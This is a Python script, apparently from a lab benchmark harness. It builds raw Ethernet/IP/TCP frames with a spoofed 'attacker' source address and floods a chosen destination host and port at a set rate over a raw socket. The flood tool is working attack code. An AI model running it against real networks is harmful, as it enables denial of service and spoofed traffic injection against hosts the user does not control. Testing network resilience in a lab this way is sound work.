from __future__ import annotations

import argparse
import json
import socket
import struct
import time


ATTACKER_IP = "198.18.0.1"
ATTACKER_MAC = "02:00:00:00:00:01"


def main() -> None:
    parser = argparse.ArgumentParser(description="Send bounded invalid TCP payloads on a lab RF medium")
    parser.add_argument("--interface", required=True)
    parser.add_argument("--destination-mac", required=True)
    parser.add_argument("--destination-ip", required=True)
    parser.add_argument("--destination-port", type=int, required=True)
    parser.add_argument("--rate", type=float, required=True)
    parser.add_argument("--payload-size", type=int, required=True)
    parser.add_argument("--duration", type=float, required=True)
    args = parser.parse_args()

    if args.rate <= 0 or args.payload_size < 1 or args.duration <= 0:
        raise SystemExit("rate, payload-size, and duration must be positive")

    expected = max(1, int(args.rate * args.duration))
    interval = 1.0 / args.rate
    payload = (b"BENCHMARK_RF_FLOOD" * ((args.payload_size // 18) + 1))[: args.payload_size]
    destination_mac = _mac_bytes(args.destination_mac)
    destination_ip = socket.inet_aton(args.destination_ip)
    source_ip = socket.inet_aton(ATTACKER_IP)
    sent = 0
    started = time.monotonic()

    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as sock:
        sock.bind((args.interface, 0))
        for index in range(expected):
            source_port = 40000 + (index % 20000)
            frame = _tcp_frame(
                destination_mac=destination_mac,
                source_ip=source_ip,
                destination_ip=destination_ip,
                source_port=source_port,
                destination_port=args.destination_port,
                sequence=index,
                payload=payload,
            )
            sock.send(frame)
            sent += 1
            remaining = started + (index + 1) * interval - time.monotonic()
            if remaining > 0:
                time.sleep(remaining)

    print(json.dumps({
        "attempted_frames": expected,
        "sent_frames": sent,
        "payload_size": args.payload_size,
        "rate_per_second": args.rate,
        "duration_seconds": args.duration,
        "attacker_ip": ATTACKER_IP,
        "attacker_mac": ATTACKER_MAC,
        "destination_ip": args.destination_ip,
        "destination_port": args.destination_port,
    }, sort_keys=True))


def _tcp_frame(
    *,
    destination_mac: bytes,
    source_ip: bytes,
    destination_ip: bytes,
    source_port: int,
    destination_port: int,
    sequence: int,
    payload: bytes,
) -> bytes:
    tcp = struct.pack(
        "!HHLLBBHHH",
        source_port,
        destination_port,
        sequence,
        0,
        5 << 4,
        0x18,  # PSH|ACK: never matches the established protected TCP tuple.
        8192,
        0,
        0,
    ) + payload
    tcp_checksum = _checksum(source_ip + destination_ip + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp)) + tcp)
    tcp = tcp[:16] + struct.pack("!H", tcp_checksum) + tcp[18:]
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        20 + len(tcp),
        sequence & 0xFFFF,
        0,
        64,
        socket.IPPROTO_TCP,
        0,
        source_ip,
        destination_ip,
    )
    ip = ip[:10] + struct.pack("!H", _checksum(ip)) + ip[12:]
    return destination_mac + _mac_bytes(ATTACKER_MAC) + b"\x08\x00" + ip + tcp


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(int.from_bytes(data[index:index + 2], "big") for index in range(0, len(data), 2))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def _mac_bytes(value: str) -> bytes:
    return bytes(int(part, 16) for part in value.split(":"))


if __name__ == "__main__":
    main()
